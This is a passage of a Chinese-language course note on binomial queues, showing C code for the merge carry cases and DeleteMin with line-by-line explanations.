</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#note-ads-wk4-__codelineno-2-7"></a><span class="w">        </span><span class="n">T1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"> </span><span class="n">T2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H2</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"> </span><span class="cm">/*current trees */</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#note-ads-wk4-__codelineno-2-8"></a><span class="w">        </span><span class="k">switch</span><span class="p">(</span><span class="w"> </span><span class="mi">4</span><span class="o">*!!</span><span class="n">Carry</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="o">*!!</span><span class="n">T2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">!!</span><span class="n">T1</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#note-ads-wk4-__codelineno-2-9"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span><span class="w"> </span><span class="cm">/* 000 */</span><span class="w">  </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#note-ads-wk4-__codelineno-2-10"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="cm">/* 001 */</span><span class="w">  </span><span class="k">break</span><span class="p">;</span><span class="w">   </span>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#note-ads-wk4-__codelineno-2-11"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="cm">/* 010 */</span><span class="w">  </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">T2</span><span class="p">;</span><span class="w"> </span><span class="n">H2</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#note-ads-wk4-__codelineno-2-12"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span><span class="w"> </span><span class="cm">/* 100 */</span><span class="w">  </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Carry</span><span class="p">;</span><span class="w"> </span><span class="n">Carry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#note-ads-wk4-__codelineno-2-13"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span><span class="w"> </span><span class="cm">/* 011 */</span><span class="w">  </span><span class="n">Carry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CombineTrees</span><span class="p">(</span><span class="w"> </span><span class="n">T1</span><span class="p">,</span><span class="w"> </span><span class="n">T2</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#note-ads-wk4-__codelineno-2-14"></a><span class="w">                        </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H2</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#note-ads-wk4-__codelineno-2-15"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span><span class="w"> </span><span class="cm">/* 101 */</span><span class="w">  </span><span class="n">Carry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CombineTrees</span><span class="p">(</span><span class="w"> </span><span class="n">T1</span><span class="p">,</span><span class="w"> </span><span class="n">Carry</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#note-ads-wk4-__codelineno-2-16"></a><span class="w">                        </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#note-ads-wk4-__codelineno-2-17"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">6</span><span class="p">:</span><span class="w"> </span><span class="cm">/* 110 */</span><span class="w">  </span><span class="n">Carry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CombineTrees</span><span class="p">(</span><span class="w"> </span><span class="n">T2</span><span class="p">,</span><span class="w"> </span><span class="n">Carry</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#note-ads-wk4-__codelineno-2-18"></a><span class="w">                        </span><span class="n">H2</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#note-ads-wk4-__codelineno-2-19"></a><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mi">7</span><span class="p">:</span><span class="w"> </span><span class="cm">/* 111 */</span><span class="w">  </span><span class="n">H1</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Carry</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#note-ads-wk4-__codelineno-2-20"></a><span class="w">                        </span><span class="n">Carry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CombineTrees</span><span class="p">(</span><span class="w"> </span><span class="n">T1</span><span class="p">,</span><span class="w"> </span><span class="n">T2</span><span class="w"> </span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#note-ads-wk4-__codelineno-2-21"></a><span class="w">                        </span><span class="n">H2</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#note-ads-wk4-__codelineno-2-22"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="cm">/* end switch */</span>
</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#note-ads-wk4-__codelineno-2-23"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="cm">/* end for-loop */</span>
</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#note-ads-wk4-__codelineno-2-24"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">H1</span><span class="p">;</span>
</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#note-ads-wk4-__codelineno-2-25"></a><span class="p">}</span>
</span></code></pre></div>
<ul>
<li><code>4*!!Carry + 2*!!T2 + !!T1</code>的作用是将树转换为二进制表示，对于第一个非，如果是空，那么为1，如果非空，那么为0，再取非，就再取反，然后转换为3位的二进制数字</li>
<li><code>000</code>什么都不用做，此时三个位置都是0</li>
<li><code>001</code>什么都不用做，此时<code>H1</code>有树，<code>H2</code>没有东西需要合并上去的</li>
<li><code>010</code>此时将<code>H2</code>的树转移到<code>H1</code></li>
<li><code>011</code>需要进位，<code>Carry</code>要变成两树之和，两树要清空</li>
<li><code>100</code>将<code>Carry</code>转移到<code>H1</code></li>
<li><code>101</code>需要进位,当位置0，将<code>Carry</code>变得更大</li>
<li><code>110</code>与上一情况类似</li>
<li><code>111</code>这里的做法并不唯一，我们可以保留任意一棵树,将另外两树之和进位上去，不过这里采用的是保留<code>Carry</code>,进位<code>T1+T2</code></li>
</ul>
<h3 id="note-ads-wk4-deletemin">Deletemin<a class="headerlink" href="#note-ads-wk4-deletemin" title="Permanent link">&para;</a></h3>
<div class="language-c highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-ads-wk4-__codelineno-3-1"></a><span class="n">ElementType</span><span class="w">  </span><span class="nf">DeleteMin</span><span class="p">(</span><span class="w"> </span><span class="n">BinQueue</span><span class="w"> </span><span class="n">H</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-ads-wk4-__codelineno-3-2"></a><span class="p">{</span><span class="w">   </span><span class="n">BinQueue</span><span class="w"> </span><span class="n">DeletedQueue</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-ads-wk4-__codelineno-3-3"></a><span class="w">    </span><span class="n">Position</span><span class="w"> </span><span class="n">DeletedTree</span><span class="p">,</span><span class="w"> </span><span class="n">OldRoot</span><span class="p">;</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-ads-wk4-__codelineno-3-4"></a><span class="w">    </span><span class="n">ElementType</span><span class="w"> </span><span class="n">MinItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Infinity</span><span class="p">;</span><span class="w">  </span><span class="cm">/* the minimum item to be returned */</span><span class="w">  </span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-ads-wk4-__codelineno-3-5"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="n">MinTree</span><span class="p">;</span><span class="w"> </span><span class="cm">/* MinTree is the index of the tree with the minimum item */</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#note-ads-wk4-__codelineno-3-6"></a>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#note-ads-wk4-__codelineno-3-7"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">IsEmpty</span><span class="p">(</span><span class="w"> </span><span class="n">H</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">  </span><span class="n">PrintErrorMessage</span><span class="p">();</span><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="err">–</span><span class="n">Infinity</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#note-ads-wk4-__codelineno-3-8"></a>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#note-ads-wk4-__codelineno-3-9"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MaxTrees</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="cm">/* Step 1: find the minimum item */</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#note-ads-wk4-__codelineno-3-10"></a><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="w"> </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Element</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MinItem</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#note-ads-wk4-__codelineno-3-11"></a><span class="w">        </span><span class="n">MinItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Element</span><span class="p">;</span><span class="w">  </span><span class="n">MinTree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="cm">/* end if */</span>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#note-ads-wk4-__codelineno-3-12"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="cm">/* end for-i-loop */</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#note-ads-wk4-__codelineno-3-13"></a>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#note-ads-wk4-__codelineno-3-14"></a><span class="w">    </span><span class="n">DeletedTree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="w"> </span><span class="n">MinTree</span><span class="w"> </span><span class="p">];</span><span class="w">  </span>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#note-ads-wk4-__codelineno-3-15"></a><span class="w">    </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="w"> </span><span class="n">MinTree</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w">   </span><span class="cm">/* Step 2: remove the MinTree from H =&gt; H’ */</span><span class="w"> </span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#note-ads-wk4-__codelineno-3-16"></a><span class="w">    </span><span class="n">OldRoot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeletedTree</span><span class="p">;</span><span class="w">   </span><span class="cm">/* Step 3.1: remove the root */</span><span class="w"> </span>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#note-ads-wk4-__codelineno-3-17"></a><span class="w">    </span><span class="n">DeletedTree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeletedTree</span><span class="o">-&gt;</span><span class="n">LeftChild</span><span class="p">;</span><span class="w">   </span><span class="n">free</span><span class="p">(</span><span class="n">OldRoot</span><span class="p">);</span>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#note-ads-wk4-__codelineno-3-18"></a><span class="w">    </span><span class="n">DeletedQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Initialize</span><span class="p">();</span><span class="w">   </span><span class="cm">/* Step 3.2: create H” */</span><span class="w"> </span>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#note-ads-wk4-__codelineno-3-19"></a>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#note-ads-wk4-__codelineno-3-20"></a><span class="w">    </span><span class="n">DeletedQueue</span><span class="o">-&gt;</span><span class="n">CurrentSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">MinTree</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="err">–</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">  </span><span class="cm">/* 2^{MinTree} – 1 */</span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#note-ads-wk4-__codelineno-3-21"></a>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#note-ads-wk4-__codelineno-3-22"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MinTree</span><span class="w"> </span><span class="err">–</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="err">–</span><span class="w"> </span><span class="err">–</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#note-ads-wk4-__codelineno-3-23"></a><span class="w">        </span><span class="n">DeletedQueue</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeletedTree</span><span class="p">;</span>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#note-ads-wk4-__codelineno-3-24"></a><span class="w">        </span><span class="n">DeletedTree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeletedTree</span><span class="o">-&gt;</span><span class="n">NextSibling</span><span class="p">;</span>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#note-ads-wk4-__codelineno-3-25"></a><span class="w">        </span><span class="n">DeletedQueue</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">NextSibling</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#note-ads-wk4-__codelineno-3-26"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="c1">//将树拆开</span>
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#note-ads-wk4-__codelineno-3-27"></a>
</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#note-ads-wk4-__codelineno-3-28"></a><span class="w">    </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">CurrentSize</span><span class="w">  </span><span class="err">–</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeletedQueue</span><span class="o">-&gt;</span><span class="n">CurrentSize</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="c1">//minus 2^{MinTree}</span>
</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#note-ads-wk4-__codelineno-3-29"></a><span class="w">    </span><span class="n">H</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Merge</span><span class="p">(</span><span class="w"> </span><span class="n">H</span><span class="p">,</span><span class="w"> </span><span class="n">DeletedQueue</span><span class="w"> </span><span class="p">);</span><span class="w"> </span><span class="cm">/* Step 4: merge H’ and H” */</span><span class="w"> </span>
</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#note-ads-wk4-__codelineno-3-30"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">MinItem</span><span class="p">;</span>
</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#note-ads-wk4-__codelineno-3-31"></a><span class="p">}</span>
</span></code></pre></div>
<details class="explanation">
<summary>Explanation</summary>
<p>比较简单，就照抄了GPT了</p>
<p><strong>函数原型和输入参数</strong></p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-ads-wk4-__codelineno-4-1"></a><span class="n">ElementType</span><span class="w"> </span><span class="n">DeleteMin</span><span class="p">(</span><span class="n">BinQueue</span><span class="w"> </span><span class="n">H</span><span class="p">)</span>
</span></code></pre></div>
<ul>
<li><strong><code>ElementType</code></strong>: 返回删除的最小元素的类型。</li>
<li><strong><code>BinQueue H</code></strong>: 要从中删除最小元素的二项队列。</li>
</ul>
<p><strong>变量初始化</strong></p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-ads-wk4-__codelineno-5-1"></a><span class="n">BinQueue</span><span class="w"> </span><span class="n">DeletedQueue</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-ads-wk4-__codelineno-5-2"></a><span class="n">Position</span><span class="w"> </span><span class="n">DeletedTree</span><span class="p">,</span><span class="w"> </span><span class="n">OldRoot</span><span class="p">;</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#note-ads-wk4-__codelineno-5-3"></a><span class="n">ElementType</span><span class="w"> </span><span class="n">MinItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Infinity</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#note-ads-wk4-__codelineno-5-4"></a><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="n">MinTree</span><span class="p">;</span>
</span></code></pre></div>
<ul>
<li><strong><code>DeletedQueue</code></strong>: 用于存储将要删除的树。</li>
<li><strong><code>DeletedTree</code></strong>: 指向当前处理的树。</li>
<li><strong><code>OldRoot</code></strong>: 保存被删除的根节点。</li>
<li><strong><code>MinItem</code></strong>: 初始设为正无穷，用于跟踪最小元素。</li>
<li><strong><code>MinTree</code></strong>: 存储最小元素所在树的索引。</li>
</ul>
<p><strong>检查队列是否为空</strong></p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-ads-wk4-__codelineno-6-1"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">IsEmpty</span><span class="p">(</span><span class="n">H</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">PrintErrorMessage</span><span class="p">();</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">Infinity</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
</span></code></pre></div>
<ul>
<li>检查二项队列是否为空。如果为空，则打印错误信息并返回负无穷。</li>
</ul>
<p><strong>找到最小元素</strong>
<div class="language-c highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-ads-wk4-__codelineno-7-1"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MaxTrees</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-ads-wk4-__codelineno-7-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Element</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MinItem</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-ads-wk4-__codelineno-7-3"></a><span class="w">        </span><span class="n">MinItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">Element</span><span class="p">;</span><span class="w">  </span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-ads-wk4-__codelineno-7-4"></a><span class="w">        </span><span class="n">MinTree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w">    </span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#note-ads-wk4-__codelineno-7-5"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#note-ads-wk4-__codelineno-7-6"></a><span class="p">}</span>
</span></code></pre></div></p>
<ul>
<li>遍历所有树，找到具有最小元素的树（即最小根节点）。</li>
<li>如果找到更小的元素，则更新<code>MinItem</code>和<code>MinTree</code>。</li>
</ul>
<p><strong>删除最小元素的树</strong>
<div class="language-c highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-ads-wk4-__codelineno-8-1"></a><span class="n">DeletedTree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">MinTree</span><span class="p">];</span><span class="w">  </span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-ads-wk4-__codelineno-8-2"></a><span class="n">H</span><span class="o">-&gt;</span><span class="n">TheTrees</span><span class="p">[</span><span class="n">MinTree</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w">   </span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#note-ads-wk4-__codelineno-8-3"></a><span class="n">OldRoot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeletedTree</span><span class="p">;</span><span class="w">   </span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#note-ads-wk4-__codelineno-8-4"></a><span class="n">DeletedTree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DeletedTree</span><span class="o">-&gt;</span><span class="n">LeftChild</span><span class="p">;</span><span class="w">   </span>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#note-ads-wk4-__codelineno-8-5"></a><span class="n">free</span><span class="p">(</span><span class="n">OldRoot</span><span class="p">);</span>
</span></code></pre></div></p>
<ul>
<li>将最小树存储在<code>DeletedTree</code>中，并在原队列中将其置为NULL。</li>
<li>保存根节点到<code>OldRoot</code>，然后将<code>DeletedTree</code>指向其左子树。</li>
<li>释放<code>OldRoot</code>所占的内存。</li>
</ul>
<p><strong>初始化新的队列</strong>
<div class="language-c highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-ads-wk4-__codelineno-9-1"></a><span class="n">DeletedQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Initialize</span><span class="p">();</span><span class="w">   </span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#note-ads-wk4-__codelineno-9-2"></a><span class="n">DeletedQueue</span><span class="o">-&gt;</span><span class="n">CurrentSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">MinTree</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">  </span>
</span></code></pre></div></p>
<ul>
<li>初始化一个新的二项队列<code>DeletedQueue</code>，用于存放从最小树中拆分出的树。</li>
<li>设置<code>DeletedQueue</code>的当前大小为 <code>2^MinTree - 1</code>，因为最小树的节点数是 <code>2^MinTree - 1</code>。</li>
</ul>
<p><strong>拆分树并放入新队列</strong>
